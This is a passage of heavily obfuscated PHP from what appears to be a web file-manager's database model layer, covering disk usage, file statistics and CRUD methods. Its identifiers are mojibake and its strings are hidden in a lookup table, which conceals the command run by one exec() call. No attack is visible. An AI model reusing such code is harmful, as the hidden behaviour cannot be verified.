$¢²ú™éä[344] => ucfirst($¯úí‘²Ä), $¢²ú™éä[32] => $_SERVER[$¢²ú™éä[1795]]); } private function diskDriver() { $ÇÆÈ–Í =& $_SERVER[ì…™Î¶Ï]; $ºå´øìõ = $ÇÆÈ–Í[8]; $Éº÷„Òö = $GLOBALS[$ÇÆÈ–Í[6]][$ÇÆÈ–Í[1262]] == $ÇÆÈ–Í[1263]; if ($Éº÷„Òö) { $ºå´øìõ = $ÇÆÈ–Í[1796]; if (function_exists($ÇÆÈ–Í[1797])) { exec($ÇÆÈ–Í[1798], $„»ÃØú½); $ºå´øìõ = $„»ÃØú½[1] . $ÇÆÈ–Í[8]; } } if (!file_exists($ºå´øìõ)) { return; } $â¬´µ•î = @disk_total_space($ºå´øìõ); $ÇÈ¦ã§• = $â¬´µ•î - @disk_free_space($ºå´øìõ); return array($ÇÆÈ–Í[1786] => $â¬´µ•î, $ÇÆÈ–Í[1788] => $ÇÈ¦ã§•); } public function fileChart($š«›µ–) { $êÎ¿ä¬ =& $_SERVER[ì…™Î¶Ï]; if (isset($š«›µ–[$êÎ¿ä¬[1631]])) { return Model($êÎ¿ä¬[800])->userFileTypeProfile($š«›µ–[$êÎ¿ä¬[1631]]); } if (isset($š«›µ–[$êÎ¿ä¬[1799]])) { return Model($êÎ¿ä¬[800])->groupFileTypeProfile($š«›µ–[$êÎ¿ä¬[1799]]); } $İ Ğªï = $this->sourceSize(); $şîÊ’ÍÒ = array($êÎ¿ä¬[489] => 0, $êÎ¿ä¬[403] => 1); $ÒÓäúÓÑ = Model($êÎ¿ä¬[800])->where($şîÊ’ÍÒ)->sum($êÎ¿ä¬[80]); $şîÊ’ÍÒ[$êÎ¿ä¬[403]] = 2; $Ùù¿øÄ² = Model($êÎ¿ä¬[800])->where($şîÊ’ÍÒ)->sum($êÎ¿ä¬[80]); return array($êÎ¿ä¬[738] => $İ Ğªï[$êÎ¿ä¬[80]], $êÎ¿ä¬[1733] => $İ Ğªï[$êÎ¿ä¬[1733]], $êÎ¿ä¬[1734] => (int) $ÒÓäúÓÑ, $êÎ¿ä¬[1735] => (int) $Ùù¿øÄ²); } private function sourceSize() { $ì¤·“§ =& $_SERVER[ì…™Î¶Ï]; $İ”ÄäÔ = Model($ì¤·“§[800])->where(array($ì¤·“§[402] => 0))->sum($ì¤·“§[80]); $Ôöö«Ì… = Model($ì¤·“§[461])->sum($ì¤·“§[80]); if ($Ôöö«Ì… > $İ”ÄäÔ) { $Ôöö«Ì… = $İ”ÄäÔ; } return array($ì¤·“§[80] => (int) $İ”ÄäÔ, $ì¤·“§[1733] => (int) $Ôöö«Ì…); } } goto CÒöâ’Æ; e–Î½‡¢óë: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\x65", "\157\162\x64\145\x72", "\x61\x6c\151\141\x73", "\150\x61\166\151\156\x67", "\x67\x72\157\165\160", "\x6c\x6f\143\x6b", "\144\x69\x73\164\151\156\x63\x74", "\x61\x75\x74\x6f", "\146\x69\154\164\x65\162", "\x76\141\x6c\151\144\x61\x74\145", "\x72\x65\163\165\154\x74", "\142\151\156\144", "\x74\157\153\x65\156"); public function __construct($ÄœŸ…­¶ = '', $È ÔÆş = '', $Ó£©¥ÃÈ = '') { $”„¶â¿ =& $_SERVER[ì…™Î¶Ï]; $this->_initialize(); if (!empty($ÄœŸ…­¶)) { if (strpos($ÄœŸ…­¶, $”„¶â¿[10])) { list($this->dbName, $this->name) = explode($”„¶â¿[10], $ÄœŸ…­¶); } else { $this->name = $ÄœŸ…­¶; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($È ÔÆş)) { $this->tablePrefix = $”„¶â¿[12]; } elseif ($”„¶â¿[12] != $È ÔÆş) { $this->tablePrefix = $È ÔÆş; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($”„¶â¿[239]); } $this->db(0, empty($this->connection) ? $Ó£©¥ÃÈ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $£ö ¤¤ =& $_SERVER[ì…™Î¶Ï]; if (empty($this->fields)) { if (think_config($£ö ¤¤[240])) { $»ä¼»ßë = $this->dbName ? $this->dbName : think_config($£ö ¤¤[241]); $ĞŒ¸ı‰û = think_var_cache($£ö ¤¤[242] . strtolower(get_path_this($»ä¼»ßë) . $£ö ¤¤[10] . $this->name)); if ($ĞŒ¸ı‰û) { $àŒ™’Ñ = think_config($£ö ¤¤[243]); if (empty($àŒ™’Ñ) || $ĞŒ¸ı‰û[$£ö ¤¤[244]] == $àŒ™’Ñ) { $this->fields = $ĞŒ¸ı‰û; return; } } } $this->flush(); } } public function flush() { $·ÛÒ½Ê‰ =& $_SERVER[ì…™Î¶Ï]; $this->db->setModel($this->name); $ßÀ´œÔ = $this->db->getFields($this->getTableName()); if (!$ßÀ´œÔ) { return !1; } $this->fields = array_keys($ßÀ´œÔ); $this->fields[$·ÛÒ½Ê‰[245]] = !1; foreach ($ßÀ´œÔ as $¤‹óüù => $…Í©É°Ú) { $ãÊ¬ª¨[$¤‹óüù] = $…Í©É°Ú[$·ÛÒ½Ê‰[33]]; if ($…Í©É°Ú[$·ÛÒ½Ê‰[39]]) { $this->fields[$·ÛÒ½Ê‰[246]] = $¤‹óüù; if ($…Í©É°Ú[$·ÛÒ½Ê‰[42]]) { $this->fields[$·ÛÒ½Ê‰[245]] = !0; } } } $this->fields[$·ÛÒ½Ê‰[247]] = $ãÊ¬ª¨; if (think_config($·ÛÒ½Ê‰[243])) { $this->fields[$·ÛÒ½Ê‰[244]] = think_config($·ÛÒ½Ê‰[243]); } if (think_config($·ÛÒ½Ê‰[240])) { $¶í±·û– = $this->dbName ? $this->dbName : think_config($·ÛÒ½Ê‰[241]); think_var_cache($·ÛÒ½Ê‰[242] . strtolower(get_path_this($¶í±·û–) . $·ÛÒ½Ê‰[10] . $this->name), $this->fields); } } public function switchModel($¸²ÆÁ©, $òÈÍ¨Ğ = array()) { $Ş€èëÜú =& $_SERVER[ì…™Î¶Ï]; $ÅÁœËëÍ = ucwords(strtolower($¸²ÆÁ©)) . $Ş€èëÜú[248]; if (!class_exists($ÅÁœËëÍ)) { think_exception($ÅÁœËëÍ . think_lang($Ş€èëÜú[249])); } $this->_extModel = new $ÅÁœËëÍ($this->name); if (!empty($òÈÍ¨Ğ)) { foreach ($òÈÍ¨Ğ as $¥şƒÃ¹ï) { $this->_extModel->setProperty($¥şƒÃ¹ï, $this->{$¥şƒÃ¹ï}); } } return $this->_extModel; } public function __set($ù›øø Ÿ, $ÛÙôèÑÈ) { $this->data[$ù›øø Ÿ] = $ÛÙôèÑÈ; } public function __get($±’ÕØ“¬) { return isset($this->data[$±’ÕØ“¬]) ? $this->data[$±’ÕØ“¬] : null; } public function __isset($¶ûú»¶) { return isset($this->data[$¶ûú»¶]); } public function __unset($ı–ÉÜ¯±) { unset($this->data[$ı–ÉÜ¯±]); } public function __call($›£ÃÉÌõ, $ùôĞÏ…˜) { $‰Â€®éë =& $_SERVER[ì…™Î¶Ï]; if (in_array(strtolower($›£ÃÉÌõ), $this->methods, !0)) { $this->options[strtolower($›£ÃÉÌõ)] = $ùôĞÏ…˜[0]; return $this; } elseif (in_array(strtolower($›£ÃÉÌõ), array($‰Â€®éë[250], $‰Â€®éë[251], $‰Â€®éë[252], $‰Â€®éë[253], $‰Â€®éë[254]), !0)) { $â†û‹µş = isset($ùôĞÏ…˜[0]) ? $ùôĞÏ…˜[0] : $‰Â€®éë[181]; $â†û‹µş = $this->db->parseKey($â†û‹µş); return $this->getField(strtoupper($›£ÃÉÌõ) . $‰Â€®éë[255] . $â†û‹µş . $‰Â€®éë[256] . $›£ÃÉÌõ, $‰Â€®éë[250]); } elseif (strtolower(substr($›£ÃÉÌõ, 0, 5)) == $‰Â€®éë[257]) { $â†û‹µş = think_parse_name(substr($›£ÃÉÌõ, 5)); $¿¥­È¬å[$â†û‹µş] = $ùôĞÏ…˜[0]; return $this->where($¿¥­È¬å)->find(); } elseif (strtolower(substr($›£ÃÉÌõ, 0, 10)) == $‰Â€®éë[258]) { $Ş©ó¸ûÌ = think_parse_name(substr($›£ÃÉÌõ, 10)); $¿¥­È¬å[$Ş©ó¸ûÌ] = $ùôĞÏ…˜[0]; return $this->where($¿¥­È¬å)->getField($ùôĞÏ…˜[1]); } elseif (isset($this->_scope[$›£ÃÉÌõ])) { return $this->scope($›£ÃÉÌõ, $ùôĞÏ…˜[0]); } elseif (method_exists($this, $›£ÃÉÌõ)) { array_unshift($ùôĞÏ…˜, $›£ÃÉÌõ); return call_user_func_array(array($this, $‰Â€®éë[259]), $ùôĞÏ…˜); } else { return call_user_func_array(array(parent, $›£ÃÉÌõ), $ùôĞÏ…˜); } } protected function call() { $ËË«ïœ =& $_SERVER[ì…™Î¶Ï]; $ Æû±èª = func_get_args(); $¼­¯°É¨ = array_shift($ Æû±èª); $À¤„è±Ğ = $¼­¯°É¨; if (is_array($¼­¯°É¨)) { $À¤„è±Ğ = $¼­¯°É¨[1]; $¼­¯°É¨ = $¼­¯°É¨[0]; } $ñ¡ƒ ºŞ = count($ Æû±èª) - 1; if (isset($ Æû±èª[$ñ¡ƒ ºŞ]) && $ Æû±èª[$ñ¡ƒ ºŞ] === $¼­¯°É¨) { think_exception(__CLASS__ . $ËË«ïœ[4] . $¼­¯°É¨ . think_lang($ËË«ïœ[260])); return; } $ Æû±èª[] = $¼­¯°É¨; if (method_exists($this, $ËË«ïœ[261])) { $¯ÇòğÂÆ = call_user_func_array(array($this, $ËË«ïœ[262]), array($À¤„è±Ğ, $ Æû±èª)); if (!is_null($¯ÇòğÂÆ) && $¯ÇòğÂÆ !== !1) { return $¯ÇòğÂÆ; } } $‘½äà«× = call_user_func_array(array($this, $¼­¯°É¨), $ Æû±èª); if (method_exists($this, $ËË«ïœ[263])) { $¯ÇòğÂÆ = call_user_func_array(array($this, $ËË«ïœ[264]), array($À¤„è±Ğ, $ Æû±èª, $‘½äà«×)); if ($¯ÇòğÂÆ) { return $¯ÇòğÂÆ; } } return $‘½äà«×; } protected function _initialize() { } protected function _facade($¬èŠ’¢½) { $ÛÎûœÄè =& $_SERVER[ì…™Î¶Ï]; if (!empty($this->fields)) { foreach ($¬èŠ’¢½ as $ş—ç‡Œ => $æ„ÍÇ) { if (is_array($this->fields) && !in_array($ş—ç‡Œ, $this->fields, !0)) { unset($¬èŠ’¢½[$ş—ç‡Œ]); } elseif (is_scalar($æ„ÍÇ)) { $this->_parseType($¬èŠ’¢½, $ş—ç‡Œ); } } } if (!empty($this->options[$ÛÎûœÄè[265]])) { $¬èŠ’¢½ = array_map($this->options[$ÛÎûœÄè[265]], $¬èŠ’¢½); unset($this->options[$ÛÎûœÄè[265]]); } $this->_beforeWrite($¬èŠ’¢½); return $¬èŠ’¢½; } protected function _beforeWrite(&$êˆ÷æÖü) { } public function add($åµ‰ËÓ = '', $ğºì¸è© = array(), $ºÚÕ”Ùä = false) { if (empty($åµ‰ËÓ)) { if (!empty($this->data)) { $åµ‰ËÓ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ì…™Î¶Ï][266]); return !1; } } $ğºì¸è© = $this->_parseOptions($ğºì¸è©); $åµ‰ËÓ = $this->_facade($åµ‰ËÓ); if (!1 === $this->_beforeInsert($åµ‰ËÓ, $ğºì¸è©)) { return !1; } $ÑËäöŞ­ = $this->db->insert($åµ‰ËÓ, $ğºì¸è©, $ºÚÕ”Ùä); if (!1 !== $ÑËäöŞ­) { $´”½¾¬» = $this->getLastInsID(); if ($´”½¾¬») { $åµ‰ËÓ[$this->getPk()] = $´”½¾¬»; $this->_after_insert($åµ‰ËÓ, $ğºì¸è©); return $´”½¾¬»; } $this->_after_insert($åµ‰ËÓ, $ğºì¸è©); } return $ÑËäöŞ­; } protected function _beforeInsert(&$Ê»àî¾, $ò–¬ÏŸÑ) { } protected function _after_insert($¼ó¶Ğ¾’, $§úÔãÔ) { } public function addAll($î¢ŠÙ‚™, $üæŠŞÁ­ = array(), $ëÅ²™“ğ = false) { $É‘©¶€¼ =& $_SERVER[ì…™Î¶Ï]; if (empty($î¢ŠÙ‚™)) { $this->error = think_lang($É‘©¶€¼[266]); return !1; } $üæŠŞÁ­ = $this->_parseOptions($üæŠŞÁ­); foreach ($î¢ŠÙ‚™ as $“ß“İ·ì => $œ«şÕÆÕ) { $î¢ŠÙ‚™[$“ß“İ·ì] = $this->_facade($œ«şÕÆÕ); } if (method_exists($this->db, $É‘©¶€¼[267])) { $êç¬ÔŞß = $this->db->insertAll($î¢ŠÙ‚™, $üæŠŞÁ­, $ëÅ²™“ğ); } else { $this->startTrans(); foreach ($î¢ŠÙ‚™ as $“ß“İ·ì => $œ«şÕÆÕ) { $êç¬ÔŞß = $this->db->insert($œ«şÕÆÕ, $üæŠŞÁ­, $ëÅ²™“ğ); } $this->commit(); } if (!1 !== $êç¬ÔŞß) { $®»‰¯Ñ = $this->getLastInsID(); if ($®»‰¯Ñ) { return $®»‰¯Ñ; } } return $êç¬ÔŞß; } public function selectAdd($¤ËĞÃ•  = '', $§ı”³£Ÿ = '', $Ñ‘—®Ä€ = array()) { $¨‰œÎ‡¢ =& $_SERVER[ì…™Î¶Ï]; $Ñ‘—®Ä€ = $this->_parseOptions($Ñ‘—®Ä€); if (!1 === ($°Éªé÷ü = $this->db->selectInsert($¤ËĞÃ•  ? $¤ËĞÃ•  : $Ñ‘—®Ä€[$¨‰œÎ‡¢[268]], $§ı”³£Ÿ ? $§ı”³£Ÿ : $this->getTableName(), $Ñ‘—®Ä€))) { $this->error = think_lang($¨‰œÎ‡¢[269]); return !1; } else { return $°Éªé÷ü; } } public function save($ÉĞµÊÕ· = '', $œï°„ÏÌ = array()) { $Æ„Ñ¯îõ =& $_SERVER[ì…™Î¶Ï]; if (empty($ÉĞµÊÕ·)) { if (!empty($this->data)) { $ÉĞµÊÕ· = $this->data; $this->data = array(); } else { $this->error = think_lang($Æ„Ñ¯îõ[266]); return !1; } } $ÉĞµÊÕ· = $this->_facade($ÉĞµÊÕ·); $œï°„ÏÌ = $this->_parseOptions($œï°„ÏÌ); $’ÅÃıô = $this->getPk(); if (!isset($œï°„ÏÌ[$Æ„Ñ¯îõ[270]])) { if (isset($ÉĞµÊÕ·[$’ÅÃıô])) { $éÊÕ„à†[$’ÅÃıô] = $ÉĞµÊÕ·[$’ÅÃıô]; $œï°„ÏÌ[$Æ„Ñ¯îõ[270]] = $éÊÕ„à†; unset($ÉĞµÊÕ·[$’ÅÃıô]); } else { $this->error = think_lang($Æ„Ñ¯îõ[269]); return !1; } } if (is_array($œï°„ÏÌ[$Æ„Ñ¯îõ[270]]) && isset($œï°„ÏÌ[$Æ„Ñ¯îõ[270]][$’ÅÃıô])) { $Ñ»¨Š ¦ = $œï°„ÏÌ[$Æ„Ñ¯îõ[270]][$’ÅÃıô]; } if (!1 === $this->_beforeUpdate($ÉĞµÊÕ·, $œï°„ÏÌ)) { return !1; } $¸¾‹ÌîŒ = $this->db->update($ÉĞµÊÕ·, $œï°„ÏÌ); if (!1 !== $¸¾‹ÌîŒ) { if (isset($Ñ»¨Š ¦)) { $ÉĞµÊÕ·[$’ÅÃıô] = $Ñ»¨Š ¦; } $this->_afterUpdate($ÉĞµÊÕ·, $œï°„ÏÌ); } return $¸¾‹ÌîŒ; } protected function _beforeUpdate(&$Ğşìãü‚, $½éó’ê›) { } protected function _afterUpdate($û³¾ó‚Õ, $ƒØŠ­”) { } public function delete($±ÕÌÈÛ = array()) { $µÙÔçŠú =& $_SERVER[ì…™Î¶Ï]; if (empty($±ÕÌÈÛ) && empty($this->options[$µÙÔçŠú[270]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ÊÒ¼±îŞ = $this->getPk(); if (is_numeric($±ÕÌÈÛ) || is_string($±ÕÌÈÛ)) { if (strpos($±ÕÌÈÛ, $µÙÔçŠú[50])) { $È‘†ÂÉß[$ÊÒ¼±îŞ] = array($µÙÔçŠú[271], $±ÕÌÈÛ); } else { $È‘†ÂÉß[$ÊÒ¼±îŞ] = $±ÕÌÈÛ; } $this->options[$µÙÔçŠú[270]] = $È‘†ÂÉß; } $±ÕÌÈÛ = $this->_parseOptions(); if (is_array($±ÕÌÈÛ[$µÙÔçŠú[270]]) && isset($±ÕÌÈÛ[$µÙÔçŠú[270]][$ÊÒ¼±îŞ])) { $½ˆñïÈÂ = $±ÕÌÈÛ[$µÙÔçŠú[270]][$ÊÒ¼±îŞ]; } $×èƒ°ï = $this->db->delete($±ÕÌÈÛ); if (!1 !== $×èƒ°ï) { $‡ß‰ âã = array(); if (isset($½ˆñïÈÂ)) { $‡ß‰ âã[$ÊÒ¼±îŞ] = $½ˆñïÈÂ; } $this->_after_delete($‡ß‰ âã, $±ÕÌÈÛ); } return $×èƒ°ï; } protected function _after_delete($›ğ¼ôá, $€õå±Í) { } public function select($‘ÏÛ§ãú = array()) { $¾–Ü©¸ñ =& $_SERVER[ì…™Î¶Ï]; if (is_string($‘ÏÛ§ãú) || is_numeric($‘ÏÛ§ãú)) { $úƒ¾—×å = $this->getPk(); if (strpos($‘ÏÛ§ãú, $¾–Ü©¸ñ[50])) { $Å¿»–ö[$úƒ¾—×å] = array($¾–Ü©¸ñ[271], $‘ÏÛ§ãú); } else { $Å¿»–ö[$úƒ¾—×å] = $‘ÏÛ§ãú; } $this->options[$¾–Ü©¸ñ[270]] = $Å¿»–ö; } elseif (!1 === $‘ÏÛ§ãú) { $‘ÏÛ§ãú = $this->_parseOptions(); return $¾–Ü©¸ñ[272] . $this->db->buildSelectSql($‘ÏÛ§ãú) . $¾–Ü©¸ñ[273]; } $‘ÏÛ§ãú = $this->_parseOptions(); $Ô¢û°õè = $this->db->select($‘ÏÛ§ãú); if (!1 === $Ô¢û°õè) { return !1; } if (empty($Ô¢û°õè)) { return null; } $this->_afterSelect($Ô¢û°õè, $‘ÏÛ§ãú); return $Ô¢û°õè; } protected function _afterSelect(&$Ã™ÛÅ‘Ÿ, $Ÿ‘ıÚã¯) { } public function buildSql($ÍË³Ÿœµ = array()) { $îÜš¤ù„ =& $_SERVER[ì…™Î¶Ï]; $ÍË³Ÿœµ = $this->_parseOptions($ÍË³Ÿœµ); return $îÜš¤ù„[272] . $this->db->buildSelectSql($ÍË³Ÿœµ) . $îÜš¤ù„[273]; } public function optionsValue($í–ú† = null) { if (is_null($í–ú†)) { return $this->options; } elseif (is_array($í–ú†)) { $this->options = array_merge($this->options, $í–ú†); } } protected function _parseOptions($ï‹„‰×î = array()) { $Ä¿¯Õéî =& $_SERVER[ì…™Î¶Ï]; if (is_array($ï‹„‰×î)) { $ï‹„‰×î = array_merge($this->options, $ï‹„‰×î); } $this->options = array(); if (!isset($ï‹„‰×î[$Ä¿¯Õéî[274]])) { $ï‹„‰×î[$Ä¿¯Õéî[274]] = $this->getTableName(); $Œ…ªº‹› = $this->fields; } else { $Œ…ªº‹› = $this->getDbFields(); } if (!empty($ï‹„‰×î[$Ä¿¯Õéî[275]])) { $ï‹„‰×î[$Ä¿¯Õéî[274]] .= $Ä¿¯Õéî[53] . $ï‹„‰×î[$Ä¿¯Õéî[275]]; } $ï‹„‰×î[$Ä¿¯Õéî[276]] = $this->name; if (isset($ï‹„‰×î[$Ä¿¯Õéî[270]]) && is_array($ï‹„‰×î[$Ä¿¯Õéî[270]]) && !empty($Œ…ªº‹›) && !isset($ï‹„‰×î[$Ä¿¯Õéî[277]]) && !isset($ï‹„‰×î[$Ä¿¯Õéî[274]])) { foreach ($ï‹„‰×î[$Ä¿¯Õéî[270]] as $æ§²…½œ => $¯‰óûƒ) { $æ§²…½œ = trim($æ§²…½œ); if (in_array($æ§²…½œ, $Œ…ªº‹›, !0)) { if (is_scalar($¯‰óûƒ)) { $this->_parseType($ï‹„‰×î[$Ä¿¯Õéî[270]], $æ§²…½œ); } } elseif (!is_numeric($æ§²…½œ) && $Ä¿¯Õéî[11] != substr($æ§²…½œ, 0, 1) && !1 === strpos($æ§²…½œ, $Ä¿¯Õéî[10]) && !1 === strpos($æ§²…½œ, $Ä¿¯Õéî[255]) && !1 === strpos($æ§²…½œ, $Ä¿¯Õéî[278]) && !1 === strpos($æ§²…½œ, $Ä¿¯Õéî[279])) { unset($ï‹„‰×î[$Ä¿¯Õéî[270]][$æ§²…½œ]); } } } $this->_options_filter($ï‹„‰×î); return $ï‹„‰×î; } protected function _options_filter(&$å‰¥åß) { } protected function _parseType(&$èŒƒò©Ì, $…°ÌšÆÙ) { $ï¯°ÀÑÍ =& $_SERVER[ì…™Î¶Ï]; if (empty($this->options[$ï¯°ÀÑÍ[280]][$ï¯°ÀÑÍ[4] . $…°ÌšÆÙ])) { $ŸÁêÑ£Å = strtolower($this->fields[$ï¯°ÀÑÍ[247]][$…°ÌšÆÙ]); if (!1 !== strpos($ŸÁêÑ£Å, $ï¯°ÀÑÍ[281])) { } elseif (!1 === strpos($ŸÁêÑ£Å, $ï¯°ÀÑÍ[282]) && !1 !== strpos($ŸÁêÑ£Å, $ï¯°ÀÑÍ[283])) { $èŒƒò©Ì[$…°ÌšÆÙ] = intval($èŒƒò©Ì[$…°ÌšÆÙ]); } elseif (!1 !== strpos($ŸÁêÑ£Å, $ï¯°ÀÑÍ[284]) || !1 !== strpos($ŸÁêÑ£Å, $ï¯°ÀÑÍ[285])) { $èŒƒò©Ì[$…°ÌšÆÙ] = floatval($èŒƒò©Ì[$…°ÌšÆÙ]); } elseif (!1 !== strpos($ŸÁêÑ£Å, $ï¯°ÀÑÍ[286])) { $èŒƒò©Ì[$…°ÌšÆÙ] = (bool) $èŒƒò©Ì[$…°ÌšÆÙ]; } } } public function find($Ó´Â”¨‹ = array()) { $¨ò€’ñ· =& $_SERVER[ì…™Î¶Ï]; if (is_numeric($Ó´Â”¨‹) || is_string($Ó´Â”¨‹)) { $½Ô¶§Îæ[$this->getPk()] = intval($Ó´Â”¨‹); $this->options[$¨ò€’ñ·[270]] = $½Ô¶§Îæ; } $this->options[$¨ò€’ñ·[287]] = 1; $Ó´Â”¨‹ = $this->_parseOptions(); $À‘¶Åèâ = $this->db->select($Ó´Â”¨‹); if (!1 === $À‘¶Åèâ) { return !1; } if (empty($À‘¶Åèâ)) { return null; } $this->data = $À‘¶Åèâ[0]; $this->_afterFind($this->data, $Ó´Â”¨‹); if (!empty($this->options[$¨ò€’ñ·[288]])) { return $this->returnResult($this->data, $this->options[$¨ò€’ñ·[288]]); } return $this->data; } protected function _afterFind(&$ÏèïÎÃ¦, $õ÷›òüİ) { } protected function returnResult($®¤î¸±Ç, $¨£Ã­® = '') { $½ä‘ŸŠ· =& $_SERVER[ì…™Î¶Ï]; if ($¨£Ã­®) { if (is_callable($¨£Ã­®)) { return call_user_func($¨£Ã­®, $®¤î¸±Ç); } switch (strtolower($¨£Ã­®)) { case $½ä‘ŸŠ·[289]: return json_encode($®¤î¸±Ç); case $½ä‘ŸŠ·[290]: return xml_encode($®¤î¸±Ç); } } return $®¤î¸±Ç; } public function parseFieldsMap($ÂãÀØé…, $Œá™²òì = 1) { if (!empty($this->_map)) { foreach ($this->_map as $õÂ†Æ¿Ä => $ßæ×Èà™) { if ($Œá™²òì == 1) { if (isset($ÂãÀØé…[$ßæ×Èà™])) { $ÂãÀØé…[$õÂ†Æ¿Ä] = $ÂãÀØé…[$ßæ×Èà™]; unset($ÂãÀØé…[$ßæ×Èà™]); } } else { if (isset($ÂãÀØé…[$õÂ†Æ¿Ä])) { $ÂãÀØé…[$ßæ×Èà™] = $ÂãÀØé…[$õÂ†Æ¿Ä]; unset($ÂãÀØé…[$õÂ†Æ¿Ä]); } } } } return $ÂãÀØé…; } public function setField($¹Ä×ó•õ, $Î×ƒ†° = '') { if (is_array($¹Ä×ó•õ)) { $”Äù‡­ = $¹Ä×ó•õ; } else { $”Äù‡­[$¹Ä×ó•õ] = $Î×ƒ†°; } return $this->save($”Äù‡­); } public function setAdd($¹Ñ¹ì¾•, $ÂÂşÄ•© = 1) { $şĞØëĞ– =& $_SERVER[ì…™Î¶Ï]; $ÖÎ»Ú±û = $¹Ñ¹ì¾• . $şĞØëĞ–[291] . $ÂÂşÄ•©; if ($ÂÂşÄ•© < 0) { $ÖÎ»Ú±û = $¹Ñ¹ì¾• . $ÂÂşÄ•©; } return $this->setField($¹Ñ¹ì¾•, array($şĞØëĞ–[292], $ÖÎ»Ú±û)); } public function getField($‡ÜĞœû§, $ÙÈËØ‚ = null) { $Ï‚¢ëÍ =& $_SERVER[ì…™Î¶Ï]; $¯—ÆÒäÚ[$Ï‚¢ëÍ[268]] = $‡ÜĞœû§; $¯—ÆÒäÚ = $this->_parseOptions($¯—ÆÒäÚ); $‡ÜĞœû§ = trim($‡ÜĞœû§); if (strpos($‡ÜĞœû§, $Ï‚¢ëÍ[50])) { if (!isset($¯—ÆÒäÚ[$Ï‚¢ëÍ[287]])) { $¯—ÆÒäÚ[$Ï‚¢ëÍ[287]] = is_numeric($ÙÈËØ‚) ? $ÙÈËØ‚ : $Ï‚¢ëÍ[12]; } $öÙæéô = $this->db->select($¯—ÆÒäÚ); if (!empty($öÙæéô)) { $¼çü¢Ö = explode($Ï‚¢ëÍ[50], $‡ÜĞœû§); $‡ÜĞœû§ = array_keys($öÙæéô[0]); $ÍÁ¤‹áâ = array_shift($‡ÜĞœû§); $½Ìî«œª = array_shift($‡ÜĞœû§); $Õ¨·´Ò¶ = array(); $ƒü´´Û = count($¼çü¢Ö); foreach ($öÙæéô as $È“–ò±ô) { $óÖ¤ªêô = $È“–ò±ô[$ÍÁ¤‹áâ]; if (2 == $ƒü´´Û) { $Õ¨·´Ò¶[$óÖ¤ªêô] = $È“–ò±ô[$½Ìî«œª]; } else { $Õ¨·´Ò¶[$óÖ¤ªêô] = is_string($ÙÈËØ‚) ? implode($ÙÈËØ‚, $È“–ò±ô) : $È“–ò±ô; } } return $Õ¨·´Ò¶; } } else { if (!0 !== $ÙÈËØ‚) { $¯—ÆÒäÚ[$Ï‚¢ëÍ[287]] = is_numeric($ÙÈËØ‚) ? $ÙÈËØ‚ : 1; } if ($ÙÈËØ‚ === $Ï‚¢ëÍ[250]) { unset($¯—ÆÒäÚ[$Ï‚¢ëÍ[287]]); } $È“–ò±ô = $this->db->select($¯—ÆÒäÚ); if (!empty($È“–ò±ô)) { if ($ÙÈËØ‚ === $Ï‚¢ëÍ[250]) { return reset($È“–ò±ô[0]); } if (!0 !== $ÙÈËØ‚ && 1 == $¯—ÆÒäÚ[$Ï‚¢ëÍ[287]]) { return reset($È“–ò±ô[0]); } foreach ($È“–ò±ô as $Á™ÃÄôö) { $ğßî›¬…[] = $Á™ÃÄôö[$‡ÜĞœû§]; } return $ğßî›¬…; } } return null; } public function create($±ãê±¨• = '', $õ’ñÂİÅ = '') { $µÇÉµçË =& $_SERVER[ì…™Î¶Ï]; if (empty($±ãê±¨•)) { $±ãê±¨• = $_POST; } elseif (is_object($±ãê±¨•)) { $±ãê±¨• = get_object_vars($±ãê±¨•); } if (empty($±ãê±¨•) || !is_array($±ãê±¨•)) { $this->error = think_lang($µÇÉµçË[266]); return !1; } $±ãê±¨• = $this->parseFieldsMap($±ãê±¨•, 0); $õ’ñÂİÅ = $õ’ñÂİÅ ? $õ’ñÂİÅ : (!empty($±ãê±¨•[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$µÇÉµçË[268]])) { $ŠÉì±— = $this->options[$µÇÉµçË[268]]; unset($this->options[$µÇÉµçË[268]]); } elseif ($õ’ñÂİÅ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ŠÉì±— = $this->insertFields; } elseif ($õ’ñÂİÅ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ŠÉì±— = $this->updateFields; } if (isset($ŠÉì±—)) { if (is_string($ŠÉì±—)) { $ŠÉì±— = explode($µÇÉµçË[50], $ŠÉì±—); } if (think_config($µÇÉµçË[293])) { $ŠÉì±—[] = think_config($µÇÉµçË[294]); } foreach ($±ãê±¨• as $Åª·ç‚ó => $îÙÔ•ú) { if (!in_array($Åª·ç‚ó, $ŠÉì±—)) { unset($±ãê±¨•[$Åª·ç‚ó]); } } } if (!$this->autoValidation($±ãê±¨•, $õ’ñÂİÅ)) { return !1; } if (!$this->autoCheckToken($±ãê±¨•)) { $this->error = think_lang($µÇÉµçË[295]); return !1; } if ($this->autoCheckFields) { $ŠÉì±— = $this->getDbFields(); foreach ($±ãê±¨• as $Åª·ç‚ó => $îÙÔ•ú) { if (!in_array($Åª·ç‚ó, $ŠÉì±—)) { unset($±ãê±¨•[$Åª·ç‚ó]); } elseif (MAGIC_QUOTES_GPC && is_string($îÙÔ•ú)) { $±ãê±¨•[$Åª·ç‚ó] = stripslashes($îÙÔ•ú); } } } $this->autoOperation($±ãê±¨•, $õ’ñÂİÅ); $this->data = $±ãê±¨•; return $±ãê±¨•; } public function autoCheckToken($Ÿ—±áä) { $Í÷«„şÈ =& $_SERVER[ì…™Î¶Ï]; if (isset($this->options[$Í÷«„şÈ[296]]) && !$this->options[$Í÷«„şÈ[296]]) { return !0; } if (think_config($Í÷«„şÈ[293])) { $Ø»¼¹ıÉ = think_config($Í÷«„şÈ[294]); if (!isset($Ÿ—±áä[$Ø»¼¹ıÉ]) || 